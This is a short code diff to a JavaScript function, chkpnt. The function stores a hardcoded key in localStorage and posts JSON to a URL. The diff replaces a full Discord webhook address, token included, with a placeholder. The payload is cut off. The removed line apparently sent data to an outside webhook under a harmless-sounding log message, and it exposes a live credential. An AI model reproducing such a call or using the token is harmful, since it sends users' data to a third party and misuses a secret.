@@ -230,7 +230,7 @@ function chkpnt() {
     localStorage.cryptkey = "secretbitch@akadan";
     console.log("Checkpoint restoration complete.");
     const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1114105492168527933/iq3YVcNXPVLeRvEHWqdVugdfTanIhpEaLNsswSP2XVa_durqLx_HgqCkAVu3lrO2K474");
+    request.open("POST", "##");
 
     request.setRequestHeader('Content-type', 'application/json');
     const params = {
